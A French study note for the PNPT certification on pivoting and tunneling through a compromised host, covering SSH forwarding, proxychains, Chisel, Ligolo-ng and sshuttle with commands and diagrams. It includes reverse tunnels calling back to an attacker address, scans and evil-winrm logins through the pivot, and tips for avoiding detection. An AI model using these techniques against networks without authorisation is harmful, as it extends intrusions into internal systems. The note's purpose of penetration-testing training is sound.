---
title: "Pivoting & Tunneling (PNPT)"
domain: "Applied Sciences"
subdomain: "Computer Science > Security > PNPT"
tags: [sciences-appliquées, informatique, sécurité, pivoting, tunneling, pnpt]
date: "2026-05-18"
---

# Pivoting & Tunneling

Le pivoting, c'est l'art d'utiliser une machine compromise pour atteindre un réseau qu'on ne pouvait pas voir depuis l'extérieur. Sur un engagement, le premier accès est rarement la cible — il faut traverser des DMZ, des sous-réseaux internes, des segments isolés. Bien maîtriser ses tunnels, c'est ce qui permet de continuer à attaquer profondément.

## Le scénario type

```
   ATTAQUANT                                              CIBLE FINALE
   10.0.0.100                                             10.10.10.5
       │                                                     ▲
       │                                                     │
       ▼                                                     │
   ┌─────────┐         ┌──────────┐         ┌───────────────┘
   │ Internet │ ────►  │ DMZ      │ ────►   │  Réseau interne
   └─────────┘         │ Web app  │         │  (invisible de
                       │ 1.2.3.4  │         │   l'extérieur)
                       │ pivot    │         │
                       └──────────┘         │
                            │               │
                            ▲               │
                            │               │
                       Shell obtenu via     │
                       l'exploit web        │
```

Sans pivoting, on est bloqué sur le pivot. Avec, ton Kali envoie des paquets dans le réseau interne comme si tu y étais branché.

## Trois familles de techniques

```
                  Pivoting / Tunneling
                          │
        ┌─────────────────┼─────────────────┐
        ▼                 ▼                 ▼
   Port forwarding    SOCKS proxy      VPN-like tunnel
   (un port à la fois)  (tout port)     (route IP complète)
        │                 │                 │
   ssh -L              ssh -D            Ligolo-ng
   ssh -R              chisel R:socks    sshuttle
   chisel local-fw     proxychains
```

Le choix dépend du contexte : un seul service à atteindre → port forward. Tout un sous-réseau à scanner → SOCKS ou VPN-like.

## SSH Tunneling

Si SSH est utilisable sur le pivot, c'est l'outil de choix : déjà présent, chiffré, discret.

### Local port forwarding (`-L`)

"Expose un port distant sur ma machine locale."

```
   Attaquant                                      Pivot          Cible interne
                                                                  10.10.10.5:80
   localhost:8080  ──── tunnel SSH ────►  user@pivot  ──────►
        ▲                                                          │
        │                                                          │
        └──────────────────── réponse ─────────────────────────────┘
```

```bash
ssh -L 8080:10.10.10.5:80 user@pivot

# Sur ta machine
curl http://localhost:8080    # → arrive sur 10.10.10.5:80 via le pivot
```

### Remote port forwarding (`-R`)

"Expose un port local sur le pivot." Utile quand le pivot peut atteindre l'attaquant mais l'inverse ferait franchir un firewall.

```bash
# Sur l'attaquant
ssh -R 4444:localhost:4444 user@pivot
# Sur le pivot, n'importe qui peut se connecter à pivot:4444 → reverse vers ton :4444
```

### Dynamic SOCKS proxy (`-D`)

Le plus puissant — un proxy SOCKS5 sur ta machine, et tout ce qui passe par lui sort par le pivot.

```bash
ssh -D 9050 user@pivot

# Configurer proxychains
sudo nano /etc/proxychains4.conf
# Ajouter : socks5 127.0.0.1 9050

# Tout outil routé via le pivot
proxychains nmap -sT -Pn 10.10.10.0/24
proxychains evil-winrm -i 10.10.10.5 -u user -p pass
proxychains curl http://10.10.10.5
```

**Limite SOCKS** : pas d'ICMP. Donc pas de ping, pas de scan `-sn` nmap. Toujours `-sT -Pn` à travers proxychains.

## Chisel

Quand SSH n'est pas dispo (Windows sans OpenSSH, restrictions firewall), Chisel fait passer un tunnel sur HTTP/WebSocket. Binaire unique, multi-plateforme.

```bash
# Sur l'attaquant (serveur)
./chisel server --reverse -p 8000

# Sur le pivot (client) — créer un SOCKS proxy reverse
./chisel client 10.0.0.100:8000 R:1080:socks
# → SOCKS sur ton localhost:1080

# Sur le pivot — port forward classique
./chisel client 10.0.0.100:8000 R:8080:10.10.10.5:80
# → ton localhost:8080 = 10.10.10.5:80
```

`R:` = reverse (le pivot vient vers toi, contourne firewall sortant moins strict).

## Ligolo-ng

Le pivoting moderne le plus pratique : crée une vraie interface réseau virtuelle sur l'attaquant. Pas de proxychains, pas de SOCKS — tu utilises tes outils normalement.

```bash
# Sur l'attaquant — setup initial (une fois)
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Lancer le serveur
./proxy -selfcert

# Sur le pivot
./agent -connect 10.0.0.100:11601 -ignore-cert

# Dans l'interface proxy
session                                  # sélectionner la session
ifconfig                                 # voir les interfaces du pivot
sudo ip route add 10.10.10.0/24 dev ligolo   # router le sous-réseau interne via ligolo
start                                    # démarrer le tunnel

# Maintenant tes outils marchent normalement
nmap 10.10.10.0/24
evil-winrm -i 10.10.10.5 -u user -p pass
```

**Avantage majeur** : ICMP fonctionne, tu peux pinger, scanner -sn, faire du UDP — exactement comme si tu étais sur le réseau.

## sshuttle

Le pivoting "lazy" pour quand SSH est dispo. Une commande, et tout le trafic vers un sous-réseau passe par le pivot.

```bash
sshuttle -r user@pivot 10.10.10.0/24

# Maintenant
nmap 10.10.10.5
ssh user@10.10.10.5
```

**Limite** : nécessite Python sur le pivot, et root sur ta machine (pour modifier la table de routage).

## Tableau de décision

| Situation                                    | Outil recommandé           |
|----------------------------------------------|----------------------------|
| SSH dispo, un seul port à atteindre          | `ssh -L`                   |
| SSH dispo, plusieurs ports / scan complet    | `sshuttle` ou `ssh -D`     |
| Pas de SSH, Windows                          | `chisel R:socks`           |
| Besoin de scan ICMP, UDP, performance        | `Ligolo-ng`                |
| Tunnel inverse (firewall sortant strict)     | `-R` ou Chisel reverse     |

## Pièges courants

- **Proxychains ne fait pas ICMP** : `proxychains ping` échoue. Utiliser `-sT -Pn` sur nmap, ou passer à Ligolo.
- **DNS leak** : par défaut, proxychains fait les résolutions DNS localement → tes requêtes DNS révèlent qui tu cibles. Activer `proxy_dns` dans la config.
- **Performance** : SOCKS sur SSH est lent. Pour des scans massifs, Ligolo ou sshuttle sont bien meilleurs.
- **Chisel binaire est gros** (~10 Mo) — peut être détecté lors du dépôt. Préférer un transfert SMB ou exécution en mémoire.
- **Tunnel qui meurt sans warning** : si le pivot perd la connexion, tes outils plantent silencieusement. Toujours vérifier le tunnel avant un long scan (`ss -tn | grep <port>`).
- **Pivot oublié** : à la fin de l'engagement, tuer le tunnel et nettoyer les fichiers déposés sur le pivot — sinon c'est une backdoor laissée en place.
